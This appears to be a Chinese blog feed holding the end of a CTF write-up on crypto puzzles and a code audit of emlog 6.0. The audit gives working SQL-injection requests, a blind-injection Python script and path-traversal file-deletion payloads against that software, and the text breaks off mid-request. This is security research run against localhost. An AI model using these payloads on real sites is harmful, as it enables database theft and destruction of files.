class="string">'Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1NHVkVRbUZXVmxsM1ZqQmFTMlJIVmtkWGJGcHBWa1phZVZadGVGWmxSbGw1Vkd0c2FsSnRhRzlVVm1oRFZWWmFkR05GZEZSTlZXdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbXRXTVhCRlZXeHdWMDFFUlRCV2Fra3hVakZhV0ZOcmFGWmlhMHBYV1d4b1UwMHhWWGhYYlhSWFRWWndNRlZ0ZUZOVWJVWTJVbFJDVjJFeVRYaFdSRVpyVTBaT2NscEhjRk5XUjNob1YxZDRiMVV4VWtkWGJrNVlZbGhTV0ZSV1pEQk9iR3hXVjJ4T1ZXSkdjRlpXYlhoelZqRmFObEZZYUZkU1JYQklWbXBHVDFkV2NFZGhSMnhUWVROQ1dsWXhXbXROUjFGNVZXNU9hbEp0VWxsWmJGWmhZMnhXY1ZKdFJsUlNiR3cxVkZaU1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKWVFrbFdiWEJIVkRGa1YyTkZaR2hTTW5oVVdWUk9RMWRzV1hoWGJYUk9VbTE0V0ZaWGRHdFdNV1JJWVVac1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5TUmxweFUydGFiRlpzU2xwWlZWcHJZVWRGZWxGcmJGZGlXRUpJVmtSS1UxWXhXblZWYldoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxkSFVsWlVWbHBIVFRGU2MxWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreU1VZFNiRkp6Vkcxc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQnhWV3hrVTFsV1VsWlhiVVpyWWtad2VGVnRkREJWTWtwSVZXcENXbFpXY0hKWlZXUkdaVWRPU0U5V2FHaE5WbkJ2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTVc5bGJHUllaVWM1YVUxWFVucFdNV2h2VjBkS1dWVnJPVlppVkVVd1ZqQmFZVmRIVWtoa1JtUnBWbGhDU2xkV1ZtOVVNVnAwVW01S1QxWnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYVFc1b1dGbFVRWGhUUmtweVdrWm9hV0Y2Vm5oV1ZFSnZVVEZzVjFWc1dsaGlWVnB6V1d0YWQyVkdWWGxrUjNSb1lsVndWMWx1Y0V0V2JGbDZZVVJPV21FeVVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFhZbXhhVjFsc2FFTldSbXhaWTBaa2EwMVdjREJaTUZZd1lWVXhXRlZyYUZkTmFsWlVWa2Q0UzFKc1pIVlRiRlpYWWtoQ05sWkhlR0ZaVm1SR1RsWmFVRlp0YUZSWmJGcExVMnhhYzFwRVVtcE5WMUl3VlRKMGIyRkdTbk5UYlVaVlZteHdNMVpyV21GalZrcDFXa1pPVGxacmIzZFhiRlpyWXpGVmVWTnNiRnBOTW1oWVZGWmFTMVZHY0VWU2EzQnNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsV1ZuQlFWa1phWVdReVZrZFdibEpzVTBkU2NGVnFRbmRXTVZsNVpFaGtWMDFFUmpGWlZWSlBWMjFGZVZWclpHRldNMmhJV1RKemVGWXhjRWRhUlRWT1VsaENTMVp0TVRCVk1VMTRWVzVTVjJFeVVtaFZNRnBoVmpGc2MxcEVVbGRTYlhoYVdUQmFhMWRHV25OalJteGFUVVpWTVZsV1ZYaFhSbFp6WVVaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlXV3RvUTFkV1draGtSMFpvVFdzMWVsWXlOVk5oTVVsNVlVWm9XbFpGTlVSVk1WcHJWbFpHZEZKc1drNVdNVWwzVmxkNGIySXhXWGhhUldob1VtMW9WbFpzV25kTk1XeFdWMjVrVTJKSVFraFdSM2hUVlRKRmVsRllaRmhpUmxweVdYcEdWbVZXVG5KYVIyaE9UVzFvV1ZaR1l6RlZNV1JIVjJ4V1UyRXhjSE5WYlRGVFYyeGtjbFpVUmxkTmEzQktWVmMxYjFZeFdqWlNWRUpoVWtWYWNsVnFTa3RUVmxKMFlVWk9hR1ZzV2pSV2JUQjRaV3N4V0ZadVRsaGlSMmh4V2xkNFlWWXhVbGRYYlVaWFZteHdlbGxWYUd0V2F6RldWbXBTVjJKWVFtaFdiVEZHWkRGYWRWUnNWbGRTVlhCVVYxZDBWbVF5VVhoV2JGSlhWMGhDVkZWV1RsWmxiRXBFVmxod1UxRlRWWHBTUTFWNlVrRWxNMFFsTTBRJTNE'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="string">'%'</span> <span class="keyword">in</span> s:</span><br><span class="line">        s = unquote(s)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = b64decode(s)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>得到s = <code>fB__l621a4h4g_ai{&amp;i}</code>，每五位凑成flag的一个字符，最后得到flag：<code>flag{B64_&amp;_2hai_14i}</code></p><h3 id="潘汉年"><a href="#潘汉年" class="headerlink" title="潘汉年"></a>潘汉年</h3><p>题目给出字符串和提示flag格式，观察字符串和flag的ascii编码，发现从4开始逐位在原来基础上+1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"bg[`sZ*Zg'dPfP`VM_SXVd"</span></span><br><span class="line">f = <span class="string">"flag"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">print</span> ord(f[i]) - ord(s[i])</span><br></pre></td></tr></table></figure><p>结果得到4,5,6,7，验证了想法</p><p>据此对密文进行还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"bg[`sZ*Zg'dPfP`VM_SXVd"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">offset = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">    flag = flag + chr(ord(s[i]) + offset)</span><br><span class="line">    offset = offset + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>得到flag：<code>flag{c4es4r_variation}</code></p><h3 id="袁殊"><a href="#袁殊" class="headerlink" title="袁殊"></a>袁殊</h3><p>RSA 摸熟 n 过小，导致可被分解的问题，先用 openssl 提取公钥中的 e 和 n</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in warmup -in gy.key</span><br><span class="line"></span><br><span class="line">Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd:</span><br><span class="line">    c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0:</span><br><span class="line">    89:12:d9</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni</span><br><span class="line">0bXTcqTQiRLZAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>在 factordb.com 分解 n 得到素因子 p 和 q， 解得私钥 d，再解得明文 m</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">0xA9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">273821108020968288372911424519201044333</span></span><br><span class="line">q = <span class="number">280385007186315115828483000867559983517</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> GCD(e, phi) == <span class="number">1</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">c = open(<span class="string">'E:\\Downloads\\CTF\\RSA256\\fllllllag.txt'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">c = bytes_to_long(c)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;_2o!9_CTF_ECUN_&#125;</span></span><br></pre></td></tr></table></figure><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="死亡真相"><a href="#死亡真相" class="headerlink" title="死亡真相"></a>死亡真相</h3><p>题目链接：<a href="https://47.103.43.235:85/d/奇怪的单点音.wav" target="_blank" rel="noopener">https://47.103.43.235:85/d/奇怪的单点音.wav</a> </p><p><img src="\img\上海ctf\4.png" alt=""></p><p>在空缺处补0，再进行md5解密得到flag:<code>flag{hsd132456}</code></p><h3 id="大美晚报"><a href="#大美晚报" class="headerlink" title="大美晚报"></a>大美晚报</h3><p>题目链接：<a href="http://47.103.43.235:82/web/c/" target="_blank" rel="noopener">http://47.103.43.235:82/web/c/</a></p><p>题目给了一个二维码，保存图片后foremost，得到一个压缩包，提示说是管理员QQ号，直接爆破出号码：674290437</p><p>获得flag：<code>flag{d6@YX$_m^aa0}</code></p>]]></content>
    
    <summary type="html">
    
      ctf
    
    </summary>
    
      <category term="ctf" scheme="https://Foxgrin.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--emlog6.0</title>
    <link href="https://Foxgrin.github.io//posts/15210/"/>
    <id>https://Foxgrin.github.io//posts/15210/</id>
    <published>2019-03-19T12:15:00.000Z</published>
    <updated>2019-03-26T12:04:38.899Z</updated>
    
    <content type="html"><![CDATA[<p>记录emlog6.0审计过程以及漏洞分析<a id="more"></a></p><h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>分析网站根目录下<code>/index.php</code>包含的头文件<code>/init.php</code>，可以发现，其中对GET,POST等进行处理的只有第二十一行的函数<code>doStripslashes()</code>，跟踪该函数，发现该函数作用居然还是去除转义字符，所以可以说，全局对GET,POST数据实际上是毫无过滤的。所以接下来，我们可以在Seay审计系统下进行全局搜索GET和POST的数据，如果没有其他过滤，那么是非常好利用的。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h3><p><code>/admin/comment.php</code>第46行语句<code>$ip = isset($_GET[&#39;ip&#39;]) ? $_GET[&#39;ip&#39;] : &#39;&#39;;</code>未对参数<code>$_GET[&#39;ip&#39;]</code>进行过滤，在47行中将变量<code>$ip</code>传入函数<code>delCommentByIp()</code>，跟踪该函数，在<code>/include/model/comment_model.php</code>中第152行中将该参数拼接到SQL语句，经由单引号包裹</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>经过全局分析我们知道实际上<code>$_GET[&#39;ip&#39;]</code>参数是没有任何过滤的，所以我们可以很轻松的进行SQL注入，这里采用的是报错注入</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /emlog/admin/comment.php?action=delbyip&amp;ip=127.0.0.1&apos;%20and%20extractvalue(1,concat(0x3a,database(),0x3a))%23&amp;token=2559f394de1177aaf9652f6ea371566d HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/emlog/admin/comment.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>注意这里因为有检查Token机制，所以我们必须在页面上进行抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>同样在<code>/admin/tag.php</code>第44行语句<code>$tags = isset($_POST[&#39;tag&#39;]) ? $_POST[&#39;tag&#39;] : &#39;&#39;;</code>未对变量<code>$_POST[&#39;tag&#39;]</code>进行过滤，在53行中将变量<code>$tags</code>的键值传入函数<code>deleteTag()</code>，跟踪函数，在<code>/include/model/tag_model.php</code>中将该变量拼接到<code>DELETE</code>语句中</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>因为是DELETE语句，所以这里采用延时注入，同时需要注意因为我们不能保证<code>$tagId</code>一定存在于表中，而且即便存在，执行完一次也会被删除，所以这里采用<code>or</code>连接，保证后面的延时注入语句能执行，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /emlog/admin/tag.php?action=dell_all_tag HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 101</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/emlog/admin/tag.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: em_plugin_new=block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">tag[0 or if(ascii(substr(database(),0,1))%3d101,0,sleep(3))]=1&amp;token=2559f394de1177aaf9652f6ea371566d</span><br></pre></td></tr></table></figure><p>之后就是写脚本注入，但是这里同样采用了验证TOKEN机制，而且我们必须登录后台才能进行该项操作，所以需要采用python的Session机制进行登录并抓取页面TOKEN值，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(s,login_url,user,pw)</span>:</span></span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">'user'</span>:user,</span><br><span class="line">        <span class="string">'pw'</span>:pw</span><br><span class="line">        &#125;</span><br><span class="line">    r = s.post(url=login_url,data=login_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(s,token_url)</span>:</span></span><br><span class="line">    r = s.get(token_url)</span><br><span class="line">    soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line">    token = soup.find_all(<span class="string">'input'</span>,attrs=&#123;<span class="string">'name'</span>:<span class="string">'token'</span>&#125;)[<span class="number">0</span>][<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">(s,url,token)</span>:</span></span><br><span class="line">    database = <span class="string">""</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'tag[0 or if(ascii(substr(database(),%d,1))=%d,sleep(3),0)]'</span>%(i,j):<span class="string">'1'</span>,</span><br><span class="line">                <span class="string">'token'</span>:token</span><br><span class="line">            &#125;</span><br><span class="line">            start = time.perf_counter()</span><br><span class="line">            s.post(url,data=data)</span><br><span class="line">            end = time.perf_counter()</span><br><span class="line">            t = end - start</span><br><span class="line">            <span class="keyword">if</span> t &gt;= <span class="number">3</span>:</span><br><span class="line">                database = database + chr(j)</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">122</span> <span class="keyword">and</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    print(<span class="string">"database:"</span>,database)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    login_url = <span class="string">"http://127.0.0.1/emlog/admin/index.php?action=login"</span></span><br><span class="line">    login(s,login_url,<span class="string">'admin01'</span>,<span class="string">'admin01'</span>)</span><br><span class="line">    token_url = <span class="string">"http://127.0.0.1/emlog/admin/tag.php"</span></span><br><span class="line">    token = get_token(s,token_url)</span><br><span class="line">    target_url = <span class="string">"http://127.0.0.1/emlog/admin/tag.php?action=dell_all_tag"</span></span><br><span class="line">    get_database(s,target_url,token)</span><br></pre></td></tr></table></figure><p><code>/admin/navbar.php</code>第78行<code>$pages = isset($_POST[&#39;pages&#39;]) ? $_POST[&#39;pages&#39;] : array();</code>存在未过滤变量<code>$pages</code>，在85行将变量<code>$pages</code>的键值作为变量<code>$id</code>传入函数<code>addNavi()</code>中，跟踪该函数，在<code>/include/model/navi_model.php</code>中将该变量拼接到<code>INSERT</code>语句中</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>INSERT注入我们采用的是<code>select case when 条件 then sleep(3) else 1 end</code>的延时注入，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /emlog/admin/navbar.php?action=add_page HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">pages[1%2b(select case when(1%3d1) then sleep(3) else 1 end)]=1</span><br></pre></td></tr></table></figure><p>脚本参考上面，这里略</p><h3 id="2-任意文件删除漏洞"><a href="#2-任意文件删除漏洞" class="headerlink" title="2.任意文件删除漏洞"></a>2.任意文件删除漏洞</h3><p><code>/admin/data.php</code>第143-144行存在未过滤变量<code>$_POST[&#39;bak&#39;]</code>拼接到<code>unlink</code>中，导致任意路径穿越删除文件漏洞</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /emlog/admin/data.php?action=dell_all_bak HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 21</span><br><span class="line"></span><br><span class="line">bak[0]=../../hint.php</span><br></pre></td></tr></table></figure><p><code>/admin/blogger.php</code>第92行存在危险函数<code>unlink</code>，跟踪变量<code>$icon_1</code>，该变量来自80行中的sql查询字段<strong>photo</strong>返回结果，跟踪语句31行中变量<code>$photo</code>通过POST传入，有转义处理，并在72行中将photo更新到数据库中，虽然有转义处理，依旧可以造成任意路径穿越删除文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/emlog/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>实现的过程如下：先通过POST将构造的任意路径变量<code>$photo</code>更新到数据库中（<code>$action=update</code>），再通过<code>$action=delicon</code>触发<code>unlink($icon_1)</code>，进行任意文件删除</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /emlog/admin/blogger.php?action=update HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 979</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVzcf6UrvpBos4Orw</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: 